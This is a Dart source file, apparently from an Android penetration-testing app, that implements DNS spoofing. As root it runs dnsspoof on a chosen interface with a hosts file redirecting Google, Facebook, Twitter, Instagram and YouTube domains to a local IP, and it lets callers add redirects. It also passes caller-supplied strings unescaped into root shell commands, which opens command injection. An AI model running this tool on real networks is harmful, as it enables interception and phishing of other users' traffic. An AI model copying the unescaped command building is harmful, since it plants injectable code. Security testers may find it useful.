import '../core/shell_executor.dart';

class DnsSpoof {
  final ShellExecutor _shell = ShellExecutor.instance;
  bool _isActive = false;
  int? _processPid;

  Future<void> startSpoofing(String interface) async {
    if (_isActive) {
      throw Exception('DNS spoofing is already active');
    }

    try {
      // Create DNS spoofing configuration
      await _createDnsConfig();

      // Start DNS spoofing using dnsspoof
      final result = await _shell.executeCommand(
        'dnsspoof -i $interface -f /data/data/com.wimax.pentest/files/dns_hosts &',
        requireRoot: true,
      );

      if (result.exitCode == 0) {
        _isActive = true;
        
        // Get process ID
        final psResult = await _shell.executeCommand('pgrep dnsspoof');
        if (psResult.exitCode == 0) {
          _processPid = int.tryParse(psResult.stdout.toString().trim());
        }
      } else {
        throw Exception('Failed to start DNS spoofing');
      }
    } catch (e) {
      throw Exception('DNS spoofing failed: $e');
    }
  }

  Future<void> stopSpoofing() async {
    if (!_isActive) {
      throw Exception('DNS spoofing is not currently active');
    }

    try {
      if (_processPid != null) {
        await _shell.executeCommand('kill $_processPid', requireRoot: true);
      }

      // Fallback: kill all dnsspoof processes
      await _shell.executeCommand('killall dnsspoof', requireRoot: true);

      _isActive = false;
      _processPid = null;
    } catch (e) {
      throw Exception('Failed to stop DNS spoofing: $e');
    }
  }

  Future<void> _createDnsConfig() async {
    try {
      // Create basic DNS spoofing configuration
      const dnsConfig = '''
*.google.com 192.168.1.100
*.facebook.com 192.168.1.100
*.twitter.com 192.168.1.100
*.instagram.com 192.168.1.100
*.youtube.com 192.168.1.100
''';

      await _shell.executeCommand(
        'echo "$dnsConfig" > /data/data/com.wimax.pentest/files/dns_hosts',
        requireRoot: true,
      );
    } catch (e) {
      throw Exception('Failed to create DNS configuration: $e');
    }
  }

  Future<void> addDnsEntry(String domain, String ip) async {
    try {
      await _shell.executeCommand(
        'echo "$domain $ip" >> /data/data/com.wimax.pentest/files/dns_hosts',
        requireRoot: true,
      );
    } catch (e) {
      throw Exception('Failed to add DNS entry: $e');
    }
  }

  bool get isActive => _isActive;
}